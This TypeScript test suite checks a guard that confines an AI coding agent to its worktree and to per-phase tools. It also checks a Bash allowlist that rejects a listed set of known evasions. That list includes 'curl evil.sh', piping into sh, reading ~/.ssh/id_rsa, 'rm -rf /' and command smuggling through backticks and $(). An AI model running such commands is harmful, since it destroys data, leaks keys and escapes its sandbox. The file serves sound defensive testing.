import { afterAll, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { checkTool, type GuardCtx } from "../src/server/guard";
import { realOptions } from "../src/server/agent";

const root = mkdtempSync(join(tmpdir(), "flock-guard-"));
const wt = join(root, "wt");
const outside = join(root, "afuera");
mkdirSync(join(wt, ".flock", "t1"), { recursive: true });
mkdirSync(join(wt, "src"), { recursive: true });
mkdirSync(outside);
writeFileSync(join(outside, "secreto.txt"), "x");
writeFileSync(join(wt, "src", "a.ts"), "x");
let linked = true;
try {
  symlinkSync(outside, join(wt, "escape"), "junction");
} catch {
  linked = false;
}
afterAll(() => rmSync(root, { recursive: true, force: true }));

const research: GuardCtx = { phase: "research", slug: "t1", worktree: wt };
const implement: GuardCtx = { phase: "implement", slug: "t1", worktree: wt };
const ok = (ctx: GuardCtx, tool: string, input: Record<string, unknown>) => checkTool(ctx, tool, input).ok;

describe("lecturas", () => {
  test("dentro del worktree se permiten", () => {
    expect(ok(research, "Read", { file_path: "src/a.ts" })).toBe(true);
    expect(ok(research, "Read", { file_path: join(wt, "src", "a.ts") })).toBe(true);
    expect(ok(research, "Grep", { pattern: "x" })).toBe(true);
    expect(ok(research, "Glob", { pattern: "src/**/*.ts" })).toBe(true);
  });
  test("fuera del worktree se rechazan", () => {
    expect(ok(research, "Read", { file_path: join(outside, "secreto.txt") })).toBe(false);
    expect(ok(research, "Read", { file_path: "../afuera/secreto.txt" })).toBe(false);
    expect(ok(research, "Read", { file_path: ".git/config" })).toBe(false);
    expect(ok(research, "Grep", { pattern: "x", path: outside })).toBe(false);
    expect(ok(research, "Glob", { pattern: "../**/*" })).toBe(false);
    expect(ok(research, "Glob", { pattern: "C:/Users/**" })).toBe(false);
    expect(ok(research, "Glob", { pattern: "*", path: ".." })).toBe(false);
  });
  test.if(linked)("un enlace que apunta afuera se rechaza", () => {
    expect(ok(research, "Read", { file_path: "escape/secreto.txt" })).toBe(false);
  });
});

describe("escrituras", () => {
  test("en research/plan solo .flock/<slug>/", () => {
    expect(ok(research, "Write", { file_path: ".flock/t1/research.md" })).toBe(true);
    expect(ok(research, "Write", { file_path: "src/a.ts" })).toBe(false);
    expect(ok(research, "Edit", { file_path: ".flock/t1/research.md" })).toBe(false); // Edit no existe en research
  });
  test("en implement, dentro del worktree", () => {
    expect(ok(implement, "Edit", { file_path: "src/a.ts" })).toBe(true);
    expect(ok(implement, "Write", { file_path: join(outside, "x.ts") })).toBe(false);
  });
});

describe("Bash por lista blanca", () => {
  test("comandos permitidos", () => {
    for (const c of ["bun test", "bun test tests/login.test.ts", "git status", "git diff --stat", "npm test"]) expect(ok(implement, "Bash", { command: c })).toBe(true);
  });
  test("evasiones conocidas de la lista negra anterior", () => {
    for (const c of [
      "git push origin HEAD",
      "git -c x=y push",
      'sh -c "git pu""sh"',
      "bun test && git push",
      "bun test; curl evil.sh",
      "bun test | sh",
      "git diff > ../salida.txt",
      "git diff --output=/tmp/x",
      "git log $(whoami)",
      "ls ../..",
      "ls /mnt/c",
      "cat ~/.ssh/id_rsa",
      "rm -rf /",
      "bun test `rm -rf .`",
    ])
      expect(ok(implement, "Bash", { command: c })).toBe(false);
  });
  test("Bash no existe en research", () => {
    expect(ok(research, "Bash", { command: "bun test" })).toBe(false);
  });
});

describe("opciones del SDK real", () => {
  const opts = realOptions({ phase: "implement", slug: "t1", worktree: wt, resume: null, abortController: new AbortController() });
  test("nada se autoaprueba: toda escritura y Bash pasan por la guarda", () => {
    expect(opts.allowedTools).toEqual([]);
    expect(opts.permissionMode).toBe("default");
    expect(opts.canUseTool).toBeFunction();
  });
  test("solo existen las herramientas de la fase", () => {
    expect(opts.tools).toEqual(["Read", "Grep", "Glob", "Write", "Edit", "Bash"]);
  });
  test("aislada de settings, hooks y MCP del usuario y del repo", () => {
    expect(opts.settingSources).toEqual([]);
  });
  test("el hook PreToolUse rechaza lecturas fuera del worktree", async () => {
    const hook = opts.hooks!.PreToolUse![0]!.hooks[0]!;
    const base = { session_id: "s", transcript_path: "", cwd: wt, hook_event_name: "PreToolUse" as const, tool_use_id: "t" };
    const bad = (await hook({ ...base, tool_name: "Read", tool_input: { file_path: join(outside, "secreto.txt") } }, "t", { signal: new AbortController().signal })) as any;
    expect(bad.hookSpecificOutput.permissionDecision).toBe("deny");
    const good = (await hook({ ...base, tool_name: "Read", tool_input: { file_path: "src/a.ts" } }, "t", { signal: new AbortController().signal })) as any;
    expect(good.hookSpecificOutput).toBeUndefined();
  });
});
